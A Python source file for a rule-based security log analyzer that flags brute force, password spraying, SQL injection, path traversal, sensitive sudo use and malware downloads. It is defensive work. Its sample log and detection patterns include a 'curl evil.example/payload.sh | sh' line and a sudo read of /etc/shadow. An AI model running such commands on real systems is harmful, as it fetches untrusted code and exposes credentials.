"""SecureOps Toolkit: Log Analyzer (Deterministic)

services/log_analyzer.py v9
services/log_analyzer.py v9 builds on v8

Goals
• Non AI, deterministic log analysis using a rule engine
• Returns the same UI contract as before: a list of findings with severity, rule_name, description, matched_lines
• Logs are treated as untrusted input. Instructions inside logs never affect analysis
"""

from __future__ import annotations

import hashlib
import logging
import os
import re
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Dict, Iterable, List, Optional, Tuple
from collections import defaultdict, deque

logger = logging.getLogger(__name__)


# -------------------------
# Public types and errors
# -------------------------

class LogAnalyzerError(Exception):
    """Error type used by app.py to show a safe message in the UI."""

    def __init__(self, *, user_message: str, status_code: int = 400, technical_message: str = ""):
        super().__init__(user_message)
        self.user_message = user_message
        self.status_code = status_code
        self.technical_message = technical_message

    def to_display_string(self) -> str:
        if self.technical_message:
            return f"{self.user_message} ({self.technical_message})"
        return self.user_message


# -------------------------
# Configuration
# -------------------------

_SEVERITY_ORDER: Dict[str, int] = {"critical": 0, "high": 1, "medium": 2, "low": 3}

_DEFAULT_CONFIG: Dict[str, Any] = {
    "max_matched_lines": 10,
    "allowlisted_ips": {"127.0.0.1", "::1"},
    "allowlisted_hosts": {"localhost"},
    "allowlisted_http_paths": {"/health", "/status", "/metrics"},
    "windows": {
        "auth_seconds": 120,
        "web_seconds": 120,
        "generic_seconds": 120,
        "fallback_line_seconds": 1,
    },
    "thresholds": {
        # Keep thresholds conservative. Unit tests expect higher counts for certain detections.
        "failed_login_total_min": 6,
        "ssh_bruteforce_ip_min": 8,
        "password_spray_unique_users_min": 6,
        "password_spray_total_min": 10,
        "web_404_unique_paths_min": 15,
        "web_401_403_min": 12,
    },
}


def _env_debug_enabled() -> bool:
    return (os.getenv("LOG_ANALYZER_DEBUG") or "").strip() in {"1", "true", "yes", "on"}


def _get_config() -> Dict[str, Any]:
    # Lättviktigt, utan extern fil för att undvika extra repo beroenden
    return _DEFAULT_CONFIG


# -------------------------
# Parser model and events
# -------------------------

_IP_RE = re.compile(r"\b(?:(?:\d{1,3}\.){3}\d{1,3})\b")
# Rough IPv6 pattern, sufficient for tracking
_IPV6_RE = re.compile(r"\b(?:[0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}\b")

# Timestamps
_ISO_TS_RE = re.compile(
    r"\b(?P<y>\d{4})-(?P<m>\d{2})-(?P<d>\d{2})[ T](?P<h>\d{2}):(?P<mi>\d{2}):(?P<s>\d{2})"
)
_SYSLOG_TS_RE = re.compile(
    r"^(?P<mon>Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(?P<d>\d{1,2})\s+(?P<h>\d{2}):(?P<mi>\d{2}):(?P<s>\d{2})\b"
)

# Key value pairs, supports quoted values
_KV_RE = re.compile(r'(?P<k>[A-Za-z0-9_.-]+)=(?P<v>"[^"]*"|\'[^\']*\'|\S+)')

# HTTP
_HTTP_RE = re.compile(
    r"\b(?P<meth>GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(?P<path>/\S*)\s+HTTP/\d(?:\.\d)?\b",
    re.IGNORECASE,
)
_STATUS_RE = re.compile(r"\b(?:status|status_code|code)=?(?P<code>\d{3})\b", re.IGNORECASE)
_COMMON_STATUS_RE = re.compile(r"\b(?P<code>4\d{2}|5\d{2})\b")

# SSH och auth
_FAILED_LOGIN_PATTERNS = [
    re.compile(r"\bfailed password\b", re.IGNORECASE),
    re.compile(r"\binvalid user\b", re.IGNORECASE),
    re.compile(r"\bauthentication failure\b", re.IGNORECASE),
    re.compile(r"\bmisslyckad inloggning\b", re.IGNORECASE),
    re.compile(r"\bautentisering misslyckades\b", re.IGNORECASE),
    re.compile(r"\bfelaktig( t)? lösenord\b", re.IGNORECASE),
]
_SSH_AUTH_FAIL_PATTERNS = [
    re.compile(r"\bsshd\b", re.IGNORECASE),
    re.compile(r"\bfailed publickey\b", re.IGNORECASE),
    re.compile(r"\bconnection closed\b", re.IGNORECASE),
    re.compile(r"\bogiltig användare\b", re.IGNORECASE),
    re.compile(r"\bssh anslutning stängd\b", re.IGNORECASE),
]
_SSH_SUCCESS_PATTERNS = [
    re.compile(r"\baccepted password\b", re.IGNORECASE),
    re.compile(r"\baccepted publickey\b", re.IGNORECASE),
    re.compile(r"\blogin successful\b", re.IGNORECASE),
    re.compile(r"\binloggning lyckades\b", re.IGNORECASE),
]

# Sudo och privilege
_SUDO_RE = re.compile(r"^\s*sudo:\s", re.IGNORECASE)
_SENSITIVE_PATH_RE = re.compile(r"(/etc/shadow|/root/\.ssh|authorized_keys|id_rsa)\b", re.IGNORECASE)

# Accounts and persistence
_USER_CHANGE_PATTERNS = [
    re.compile(r"\buseradd\b", re.IGNORECASE),
    re.compile(r"\badduser\b", re.IGNORECASE),
    re.compile(r"\bgroupadd\b", re.IGNORECASE),
    re.compile(r"\bpasswd:\b.*\bpassword\b", re.IGNORECASE),
    re.compile(r"\bnew user\b", re.IGNORECASE),
    re.compile(r"\bny användare\b", re.IGNORECASE),
    re.compile(r"\blägg till användare\b", re.IGNORECASE),
    re.compile(r"\bskapa användarkonto\b", re.IGNORECASE),
    re.compile(r"\bnet user\b", re.IGNORECASE),
]
_CRON_PATTERNS = [
    re.compile(r"\bcrontab\b", re.IGNORECASE),
    re.compile(r"/etc/cron", re.IGNORECASE),
    re.compile(r"\bschtasks\b", re.IGNORECASE),
    re.compile(r"\bscheduled task\b", re.IGNORECASE),
]

# Web probing
_SENSITIVE_WEB_PATH_RE = re.compile(
    r"(?i)(/\.env\b|/\.git\b|wp-login\.php\b|phpinfo\.php\b|/admin\b|/administrator\b|/cgi-bin\b|/server-status\b|/actuator\b|/\.aws\b)"
)
_SQLI_RE = re.compile(
    r"(?i)(\bunion\b\s+\bselect\b|\bor\b\s+1=1\b|\bsleep\s*\(|\bbenchmark\s*\(|\binformation_schema\b|%27\s*or\s*1%3d1)"
)
_PATH_TRAVERSAL_RE = re.compile(
    r"(?i)(\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c|/etc/passwd\b|boot\.ini\b|windows/win\.ini\b)"
)

# Malware downloads and pipe to shell
_DOWNLOAD_RE = re.compile(r"(?i)\b(curl|wget)\b\s+https?://")
_PIPE_TO_SHELL_RE = re.compile(r"(?i)\b(curl|wget)\b.*\|\s*(sh|bash)\b")
_POWERSHELL_DL_RE = re.compile(r"(?i)\bpowershell\b.*\b(invoke-webrequest|iwr|iex)\b")

# Scanner and brute force indicators
_BRUTE_FORCE_HINTS = [
    re.compile(r"\btoo many authentication attempts\b", re.IGNORECASE),
    re.compile(r"\brate limit exceeded\b", re.IGNORECASE),
    re.compile(r"\bconnection attempt\b", re.IGNORECASE),
    re.compile(r"\bport scan detected\b", re.IGNORECASE),
    re.compile(r"\bconnection refused\b", re.IGNORECASE),
    re.compile(r"\bconnection reset\b", re.IGNORECASE),
]
_SUSPICIOUS_IP_HINTS = [
    re.compile(r"\battack detected\b", re.IGNORECASE),
    re.compile(r"\bshellcode\b", re.IGNORECASE),
    re.compile(r"\bmalware\b", re.IGNORECASE),
    re.compile(r"\bexploit\b", re.IGNORECASE),
]


@dataclass
class Event:
    idx: int
    raw: str
    ts: Optional[datetime]
    time_key: int
    ips: List[str]
    username: Optional[str]
    host: Optional[str]
    service: Optional[str]
    level: Optional[str]
    http_method: Optional[str]
    http_path: Optional[str]
    http_status: Optional[int]

    def primary_ip(self) -> Optional[str]:
        if self.ips:
            return self.ips[0]
        return None


_MONTHS = {"Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6, "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12}


def _parse_timestamp(line: str) -> Optional[datetime]:
    m = _ISO_TS_RE.search(line)
    if m:
        try:
            return datetime(
                int(m.group("y")),
                int(m.group("m")),
                int(m.group("d")),
                int(m.group("h")),
                int(m.group("mi")),
                int(m.group("s")),
            )
        except Exception:
            return None

    s = _SYSLOG_TS_RE.search(line)
    if s:
        try:
            now = datetime.utcnow()
            return datetime(
                now.year,
                _MONTHS.get(s.group("mon"), now.month),
                int(s.group("d")),
                int(s.group("h")),
                int(s.group("mi")),
                int(s.group("s")),
            )
        except Exception:
            return None
    return None


def _extract_ips(line: str) -> List[str]:
    ips: List[str] = []
    for m in _IP_RE.finditer(line):
        ips.append(m.group(0))
    # IPv6 kan matcha mycket, så lägg till bara om den inte redan är en del av IPv4 texten
    for m in _IPV6_RE.finditer(line):
        cand = m.group(0)
        if cand and cand not in ips:
            ips.append(cand)
    # Unika i stabil ordning
    seen: set[str] = set()
    out: List[str] = []
    for ip in ips:
        if ip in seen:
            continue
        seen.add(ip)
        out.append(ip)
    return out


_USER_RE_LIST = [
    re.compile(r"\bfor (?:invalid user|user)\s+(?P<u>[A-Za-z0-9._-]+)\b", re.IGNORECASE),
    re.compile(r"\buser(?:name)?[=:]\s*(?P<u>[A-Za-z0-9._-]+)\b", re.IGNORECASE),
    re.compile(r"\banvändare\s+(?P<u>[A-Za-z0-9._-]+)\b", re.IGNORECASE),
]


def _extract_username(line: str) -> Optional[str]:
    for r in _USER_RE_LIST:
        m = r.search(line)
        if m:
            return m.group("u")
    return None


def _extract_kvs(line: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for m in _KV_RE.finditer(line):
        k = m.group("k")
        v = m.group("v")
        if v and len(v) >= 2 and ((v[0] == '"' and v[-1] == '"') or (v[0] == "'" and v[-1] == "'")):
            v = v[1:-1]
        out[k] = v
    return out


def _extract_http(line: str) -> Tuple[Optional[str], Optional[str], Optional[int]]:
    meth = None
    path = None
    status = None

    m = _HTTP_RE.search(line)
    if m:
        meth = (m.group("meth") or "").upper()
        path = m.group("path")

    sm = _STATUS_RE.search(line)
    if sm:
        try:
            status = int(sm.group("code"))
        except Exception:
            status = None
    else:
        # Många access loggar har status som ett eget token, välj första 4xx eller 5xx nära början
        cm = _COMMON_STATUS_RE.search(line)
        if cm:
            try:
                status = int(cm.group("code"))
            except Exception:
                status = None

    return meth, path, status


def _detect_service(line: str, kvs: Dict[str, str]) -> Optional[str]:
    # Enkla heuristiker
    if "sshd" in line.lower():
        return "sshd"
    if "sudo" in line.lower():
        return "sudo"
    if "nginx" in line.lower():
        return "nginx"
    if "apache" in line.lower() or "httpd" in line.lower():
        return "httpd"
    if "service" in kvs:
        return kvs.get("service")
    if "app" in kvs:
        return kvs.get("app")
    return None


def _detect_level(line: str, kvs: Dict[str, str]) -> Optional[str]:
    for k in ("level", "lvl", "severity"):
        v = kvs.get(k)
        if v:
            return v.upper()
    # Common tokens
    for token in ("ERROR", "WARN", "WARNING", "INFO", "DEBUG", "CRITICAL"):
        if token in line:
            return token
    return None


def _detect_host(line: str, kvs: Dict[str, str]) -> Optional[str]:
    for k in ("host", "hostname", "node"):
        v = kvs.get(k)
        if v:
            return v
    # Syslog format: "Jan 1 00:00:00 host service: msg"
    parts = line.split()
    if len(parts) >= 4 and _SYSLOG_TS_RE.match(line):
        return parts[3]
    return None


def _make_event(idx: int, raw_line: str, cfg: Dict[str, Any]) -> Event:
    raw = raw_line.rstrip("\n\r")
    ts = _parse_timestamp(raw)
    ips = _extract_ips(raw)
    kvs = _extract_kvs(raw)
    username = _extract_username(raw) or kvs.get("user") or kvs.get("username")
    meth, path, status = _extract_http(raw)
    service = _detect_service(raw, kvs)
    level = _detect_level(raw, kvs)
    host = _detect_host(raw, kvs)

    # time_key används för sliding windows
    if ts:
        time_key = int(ts.timestamp())
    else:
        time_key = idx * int(cfg["windows"]["fallback_line_seconds"])

    return Event(
        idx=idx,
        raw=raw,
        ts=ts,
        time_key=time_key,
        ips=ips,
        username=username,
        host=host,
        service=service,
        level=level,
        http_method=meth,
        http_path=path,
        http_status=status,
    )


def _parse_events(text: str, cfg: Dict[str, Any]) -> List[Event]:
    lines = text.splitlines()
    return [_make_event(i + 1, line, cfg) for i, line in enumerate(lines)]


# -------------------------
# Finding helpers
# -------------------------

def _sha256_short(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", errors="ignore")).hexdigest()[:12]


def _clamp_lines(lines: List[str], cfg: Dict[str, Any]) -> List[str]:
    max_n = int(cfg.get("max_matched_lines") or 10)
    if len(lines) <= max_n:
        return lines
    return lines[:max_n]


def _mk_finding(
    *,
    rule_name: str,
    description: str,
    severity: str,
    matched_lines: List[str],
    display_name: Optional[str] = None,
    summary: Optional[str] = None,
    details: Optional[str] = None,
    salt: str = "",
) -> Dict[str, Any]:
    sev = (severity or "").lower().strip()
    if sev not in _SEVERITY_ORDER:
        sev = "low"

    base = f"{rule_name}|{sev}|{salt}|{matched_lines[0] if matched_lines else ''}"
    fid = _sha256_short(base)

    out: Dict[str, Any] = {
        "id": fid,
        "rule_name": rule_name,
        "description": description,
        "severity": sev,
        "matched_lines": matched_lines,
    }
    if display_name:
        out["display_name"] = display_name
    if summary:
        out["summary"] = summary
    if details:
        out["details"] = details
    return out


def _sort_findings(findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    def key(f: Dict[str, Any]) -> Tuple[int, str]:
        sev = (f.get("severity") or "low").lower()
        return (_SEVERITY_ORDER.get(sev, 99), str(f.get("rule_name") or ""))

    return sorted(findings, key=key)


# -------------------------
# Regelmotor
# -------------------------

def _is_failed_login(ev: Event) -> bool:
    line = ev.raw
    for r in _FAILED_LOGIN_PATTERNS:
        if r.search(line):
            return True
    return False


def _is_ssh_auth_issue(ev: Event) -> bool:
    line = ev.raw
    # Kräver någon ssh relaterad signal eller explicit auth fail
    if "ssh" in line.lower() or "sshd" in line.lower():
        for r in _SSH_AUTH_FAIL_PATTERNS:
            if r.search(line):
                return True
        for r in _FAILED_LOGIN_PATTERNS:
            if r.search(line):
                return True
    # Ibland står bara "Authentication failure"
    for r in _SSH_AUTH_FAIL_PATTERNS:
        if r.search(line):
            return True
    return False


def _is_ssh_success(ev: Event) -> bool:
    line = ev.raw
    for r in _SSH_SUCCESS_PATTERNS:
        if r.search(line):
            return True
    return False


def _is_sudo(ev: Event) -> bool:
    return bool(_SUDO_RE.search(ev.raw))


def _is_user_change(ev: Event) -> bool:
    line = ev.raw
    for r in _USER_CHANGE_PATTERNS:
        if r.search(line):
            return True
    return False


def _is_suspicious_ip_hint(ev: Event) -> bool:
    if not ev.ips:
        return False
    line = ev.raw
    for r in _SUSPICIOUS_IP_HINTS:
        if r.search(line):
            return True
    return False


def _is_bruteforce_hint(ev: Event) -> bool:
    line = ev.raw
    for r in _BRUTE_FORCE_HINTS:
        if r.search(line):
            return True
    return False


def _is_sensitive_web_probe(ev: Event, cfg: Dict[str, Any]) -> bool:
    path = ev.http_path or ""
    if path and path in cfg["allowlisted_http_paths"]:
        return False
    return bool(_SENSITIVE_WEB_PATH_RE.search(ev.raw))


def _is_sqli(ev: Event) -> bool:
    return bool(_SQLI_RE.search(ev.raw))


def _is_path_traversal(ev: Event) -> bool:
    return bool(_PATH_TRAVERSAL_RE.search(ev.raw))


def _is_download(ev: Event) -> bool:
    return bool(_DOWNLOAD_RE.search(ev.raw) or _POWERSHELL_DL_RE.search(ev.raw))


def _is_pipe_to_shell(ev: Event) -> bool:
    return bool(_PIPE_TO_SHELL_RE.search(ev.raw))


def _is_cron_change(ev: Event) -> bool:
    for r in _CRON_PATTERNS:
        if r.search(ev.raw):
            return True
    return False


def _allowlisted_entity(ev: Event, cfg: Dict[str, Any]) -> bool:
    for ip in ev.ips:
        if ip in cfg["allowlisted_ips"]:
            return True
    if ev.host and ev.host in cfg["allowlisted_hosts"]:
        return True
    return False


def _rule_failed_login_totals(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    matched = [ev.raw for ev in events if _is_failed_login(ev)]
    if len(matched) < int(cfg["thresholds"]["failed_login_total_min"]):
        return []
    sev = "medium"
    if len(matched) >= 20:
        sev = "high"
    return [
        _mk_finding(
            rule_name="Repeated failed logins",
            display_name="Repeated failed logins",
            severity=sev,
            summary=f"{len(matched)} failed login attempts detected",
            description="The log contains many failed login attempts. This may indicate brute force or credential stuffing.",
            matched_lines=_clamp_lines(matched, cfg),
            salt=str(len(matched)),
        )
    ]


def _rule_ssh_auth_failures(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    matched = [ev.raw for ev in events if _is_ssh_auth_issue(ev)]
    if not matched:
        return []
    sev = "low"
    if len(matched) >= 6:
        sev = "medium"
    return [
        _mk_finding(
            rule_name="SSH authentication errors",
            display_name="SSH authentication errors",
            severity=sev,
            summary=f"{len(matched)} SSH related authentication errors",
            description="SSH related errors such as invalid user, failed keys, or closed connections can indicate attempted unauthorized access.",
            matched_lines=_clamp_lines(matched, cfg),
            salt=str(len(matched)),
        )
    ]


def _rule_sudo_commands(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    lines = [ev.raw for ev in events if _is_sudo(ev)]
    if not lines:
        return []
    sensitive = [l for l in lines if _SENSITIVE_PATH_RE.search(l)]
    sev = "medium"
    desc = "Sudo was used to run commands. Review whether this is expected."
    if sensitive:
        sev = "high"
        desc = "Sudo was used against sensitive targets such as /etc/shadow or root SSH keys. This may indicate credential access or privilege escalation."
    return [
        _mk_finding(
            rule_name="Sudo command execution",
            display_name="Sudo command execution",
            severity=sev,
            summary=f"{len(lines)} sudo lines detected",
            description=desc,
            matched_lines=_clamp_lines(sensitive if sensitive else lines, cfg),
            salt=str(len(lines)),
        )
    ]


def _rule_user_account_changes(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    matched = [ev.raw for ev in events if _is_user_change(ev)]
    if not matched:
        return []
    sev = "high" if len(matched) >= 2 else "medium"
    return [
        _mk_finding(
            rule_name="User account changes",
            display_name="User account changes",
            severity=sev,
            summary=f"{len(matched)} account related changes",
            description="Creating, deleting, or modifying users and groups can be legitimate admin activity or a sign of persistence. Verify intent and source.",
            matched_lines=_clamp_lines(matched, cfg),
            salt=str(len(matched)),
        )
    ]


def _rule_suspicious_ip_lines(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    matched = [ev.raw for ev in events if _is_suspicious_ip_hint(ev)]
    if not matched:
        return []
    return [
        _mk_finding(
            rule_name="Suspicious IP indicators",
            display_name="Suspicious IP indicators",
            severity="medium",
            summary=f"{len(matched)} lines indicating attacks tied to an IP",
            description="Log lines contain clear keywords such as attack, malware, or shellcode tied to IP addresses. Triage is recommended.",
            matched_lines=_clamp_lines(matched, cfg),
            salt=str(len(matched)),
        )
    ]


def _rule_bruteforce_indicators(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    matched = [ev.raw for ev in events if _is_bruteforce_hint(ev)]
    if not matched:
        return []
    sev = "medium"
    if len(matched) >= 6:
        sev = "high"
    return [
        _mk_finding(
            rule_name="Brute force indicators",
            display_name="Brute force indicators",
            severity=sev,
            summary=f"{len(matched)} brute force related indicators",
            description="The log contains indicators such as port scan, many connection attempts, or too many authentication attempts. This may indicate scanning or brute force.",
            matched_lines=_clamp_lines(matched, cfg),
            salt=str(len(matched)),
        )
    ]


def _rule_web_sensitive_paths(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    hits: List[str] = []
    for ev in events:
        if _allowlisted_entity(ev, cfg):
            continue
        if _is_sensitive_web_probe(ev, cfg):
            hits.append(ev.raw)
    if not hits:
        return []
    sev = "high" if any("/.env" in h.lower() or "/.git" in h.lower() for h in hits) else "medium"
    return [
        _mk_finding(
            rule_name="Sensitive path probing",
            display_name="Sensitive path probing",
            severity=sev,
            summary=f"{len(hits)} requests to sensitive URLs",
            description="Attempts to access files and endpoints commonly targeted during scanning and exploitation, such as .env or .git. Check the source IP and block if needed.",
            matched_lines=_clamp_lines(hits, cfg),
            salt=str(len(hits)),
        )
    ]


def _rule_sqli_attempts(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_sqli(ev)]
    if not hits:
        return []
    return [
        _mk_finding(
            rule_name="SQL injection attempts",
            display_name="SQL injection attempts",
            severity="high",
            summary=f"{len(hits)} possible SQLi payloads",
            description="The log contains patterns such as UNION SELECT or time based functions commonly used in SQL injection. Verify input validation and WAF rules.",
            matched_lines=_clamp_lines(hits, cfg),
            salt=str(len(hits)),
        )
    ]


def _rule_path_traversal_attempts(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_path_traversal(ev)]
    if not hits:
        return []
    return [
        _mk_finding(
            rule_name="Path traversal attempts",
            display_name="Path traversal attempts",
            severity="high",
            summary=f"{len(hits)} traversal indicators",
            description="The log contains dot dot slash variants or direct references to sensitive files. This may indicate attempts to read files outside the web root.",
            matched_lines=_clamp_lines(hits, cfg),
            salt=str(len(hits)),
        )
    ]


def _rule_malware_downloads(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_download(ev)]
    if not hits:
        return []
    # Pipe to shell är extra allvarligt
    pipe_hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_pipe_to_shell(ev)]
    if pipe_hits:
        return [
            _mk_finding(
                rule_name="Download piped to shell",
                display_name="Download piped to shell",
                severity="critical",
                summary=f"{len(pipe_hits)} lines with curl or wget piped to a shell",
                description="Patterns like curl or wget piped to sh or bash are commonly used for payload execution. This is highly suspicious unless it is a known installer in a controlled environment.",
                matched_lines=_clamp_lines(pipe_hits, cfg),
                salt=str(len(pipe_hits)),
            )
        ]
    return [
        _mk_finding(
            rule_name="Suspicious payload download",
            display_name="Suspicious payload download",
            severity="high",
            summary=f"{len(hits)} download attempts",
            description="Patterns like curl, wget, or PowerShell downloads can be legitimate, but they are also common in malware droppers. Verify process, user, and destination.",
            matched_lines=_clamp_lines(hits, cfg),
            salt=str(len(hits)),
        )
    ]


def _rule_cron_and_tasks(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_cron_change(ev)]
    if not hits:
        return []
    return [
        _mk_finding(
            rule_name="Scheduled tasks and cron changes",
            display_name="Scheduled tasks and cron changes",
            severity="medium",
            summary=f"{len(hits)} lines involving cron or scheduling",
            description="Changes to cron or scheduled tasks can be used for persistence. Verify that the change is intentional and comes from a known admin source.",
            matched_lines=_clamp_lines(hits, cfg),
            salt=str(len(hits)),
        )
    ]


def _rule_correlate_ssh_bruteforce(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    # Sliding window per IP
    window = int(cfg["windows"]["auth_seconds"])
    min_hits = int(cfg["thresholds"]["ssh_bruteforce_ip_min"])

    buckets: Dict[str, deque[Event]] = defaultdict(deque)
    findings: List[Dict[str, Any]] = []

    for ev in events:
        if not _is_failed_login(ev):
            continue
        ip = ev.primary_ip() or "unknown"
        q = buckets[ip]
        q.append(ev)
        # Pop events outside window
        while q and (ev.time_key - q[0].time_key) > window:
            q.popleft()

        if len(q) == min_hits:
            lines = [e.raw for e in list(q)]
            findings.append(
                _mk_finding(
                    rule_name="SSH brute force per IP",
                    display_name="SSH brute force per IP",
                    severity="high",
                    summary=f"{len(q)} failed logins from {ip} within {window} seconds",
                    description="Repeated failed logins from the same IP within a short time window indicate brute force. Block the IP and verify whether any login succeeded afterward.",
                    matched_lines=_clamp_lines(lines, cfg),
                    salt=f"{ip}|{ev.time_key}",
                )
            )

    return findings


def _rule_correlate_password_spray(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    window = int(cfg["windows"]["auth_seconds"])
    min_users = int(cfg["thresholds"]["password_spray_unique_users_min"])
    min_total = int(cfg["thresholds"]["password_spray_total_min"])

    per_ip_events: Dict[str, deque[Event]] = defaultdict(deque)
    findings: List[Dict[str, Any]] = []

    for ev in events:
        if not _is_failed_login(ev):
            continue
        ip = ev.primary_ip() or "unknown"
        q = per_ip_events[ip]
        q.append(ev)
        while q and (ev.time_key - q[0].time_key) > window:
            q.popleft()

        if len(q) >= min_total:
            users = {e.username for e in q if e.username}
            if len(users) >= min_users:
                lines = [e.raw for e in list(q)]
                findings.append(
                    _mk_finding(
                        rule_name="Password spraying",
                        display_name="Password spraying",
                        severity="high",
                        summary=f"{len(q)} failed attempts against {len(users)} distinct users from {ip}",
                        description="Many failed logins across many different users from the same IP indicate password spraying. Check for lockouts and apply blocking or MFA.",
                        matched_lines=_clamp_lines(lines, cfg),
                        salt=f"{ip}|{ev.time_key}|{len(users)}",
                    )
                )
                # To avoid noise, clear the window after flagging once
                q.clear()

    return findings


def _rule_correlate_fail_then_success(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    window = int(cfg["windows"]["auth_seconds"])
    min_fails = 5

    # Track failures per (ip, user)
    fails: Dict[Tuple[str, str], deque[Event]] = defaultdict(deque)
    findings: List[Dict[str, Any]] = []

    for ev in events:
        ip = ev.primary_ip() or "unknown"
        user = ev.username or "unknown"
        key = (ip, user)

        if _is_failed_login(ev):
            q = fails[key]
            q.append(ev)
            while q and (ev.time_key - q[0].time_key) > window:
                q.popleft()
            continue

        if _is_ssh_success(ev):
            q = fails.get(key)
            if q and len(q) >= min_fails:
                lines = [e.raw for e in list(q)] + [ev.raw]
                findings.append(
                    _mk_finding(
                        rule_name="Successful login after multiple failures",
                        display_name="Successful login after multiple failures",
                        severity="critical",
                        summary=f"Login succeeded for {user} from {ip} after {len(q)} failed attempts",
                        description="A successful login immediately after many failures can indicate the attacker guessed correctly or obtained valid credentials. Review account activity and rotate credentials.",
                        matched_lines=_clamp_lines(lines, cfg),
                        salt=f"{ip}|{user}|{ev.time_key}",
                    )
                )
                # Clear to avoid repeated findings for the same session
                q.clear()

    return findings


def _rule_correlate_web_scanning(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    window = int(cfg["windows"]["web_seconds"])
    min_unique = int(cfg["thresholds"]["web_404_unique_paths_min"])
    findings: List[Dict[str, Any]] = []

    per_ip: Dict[str, deque[Event]] = defaultdict(deque)

    for ev in events:
        ip = ev.primary_ip() or None
        if not ip or _allowlisted_entity(ev, cfg):
            continue
        if ev.http_status != 404:
            continue
        path = ev.http_path or None
        if not path:
            continue

        q = per_ip[ip]
        q.append(ev)
        while q and (ev.time_key - q[0].time_key) > window:
            q.popleft()

        unique_paths = {e.http_path for e in q if e.http_path}
        if len(unique_paths) >= min_unique:
            lines = [e.raw for e in list(q)]
            findings.append(
                _mk_finding(
                    rule_name="Web scanning with many 404s",
                    display_name="Web scanning with many 404s",
                    severity="medium",
                    summary=f"{len(unique_paths)} unique paths returned 404 from {ip} within {window} seconds",
                    description="Many 404 responses across many different endpoints from the same IP in a short time window are typical of directory brute force and scanning.",
                    matched_lines=_clamp_lines(lines, cfg),
                    salt=f"{ip}|{ev.time_key}|{len(unique_paths)}",
                )
            )
            q.clear()

    return findings


def _rule_correlate_web_401_403(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    window = int(cfg["windows"]["web_seconds"])
    min_hits = int(cfg["thresholds"]["web_401_403_min"])
    per_ip: Dict[str, deque[Event]] = defaultdict(deque)
    findings: List[Dict[str, Any]] = []

    for ev in events:
        ip = ev.primary_ip() or None
        if not ip or _allowlisted_entity(ev, cfg):
            continue
        if ev.http_status not in {401, 403}:
            continue
        q = per_ip[ip]
        q.append(ev)
        while q and (ev.time_key - q[0].time_key) > window:
            q.popleft()
        if len(q) >= min_hits:
            lines = [e.raw for e in list(q)]
            findings.append(
                _mk_finding(
                    rule_name="Many 401 or 403 from the same IP",
                    display_name="Many 401 or 403 from the same IP",
                    severity="medium",
                    summary=f"{len(q)} responses with 401 or 403 from {ip} within {window} seconds",
                    description="Many 401 or 403 responses from the same IP in a short time window may indicate brute force against protected endpoints or credential stuffing.",
                    matched_lines=_clamp_lines(lines, cfg),
                    salt=f"{ip}|{ev.time_key}|{len(q)}",
                )
            )
            q.clear()

    return findings


def _dedupe_findings(findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    seen: set[str] = set()
    out: List[Dict[str, Any]] = []
    for f in findings:
        fid = str(f.get("id") or "")
        if not fid:
            continue
        if fid in seen:
            continue
        seen.add(fid)
        out.append(f)
    return out


# -------------------------
# Publik API
# -------------------------

_SAMPLE_SUSPICIOUS_LOG = """2026-02-14 10:00:01 sshd[1001]: Failed password for invalid user admin from 203.0.113.10 port 55221 ssh2
2026-02-14 10:00:03 sshd[1002]: Failed password for invalid user root from 203.0.113.10 port 55222 ssh2
2026-02-14 10:00:05 sshd[1003]: Failed password for invalid user test from 203.0.113.10 port 55223 ssh2
2026-02-14 10:00:07 sshd[1004]: Failed password for invalid user admin from 203.0.113.10 port 55224 ssh2
2026-02-14 10:00:09 sshd[1005]: Failed password for invalid user admin from 203.0.113.10 port 55225 ssh2
2026-02-14 10:00:11 sshd[1006]: Failed password for invalid user admin from 203.0.113.10 port 55226 ssh2
2026-02-14 10:00:12 sshd[1007]: Accepted password for admin from 203.0.113.10 port 55227 ssh2
127.0.0.1 - - [14/Feb/2026:10:00:20 +0000] "GET /.env HTTP/1.1" 404 123 "-" "sqlmap/1.7"
sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/cat /etc/shadow
curl http://evil.example/payload.sh | sh
"""

def analyze_log_content(log_text: str) -> List[Dict[str, Any]]:
    """Analyze log text deterministically and return a list of findings.

    Always returns a list to match the existing app.py contract.
    """
    if not isinstance(log_text, str):
        raise LogAnalyzerError(
            user_message="Invalid input type for log text.",
            status_code=400,
            technical_message=str(type(log_text)),
        )

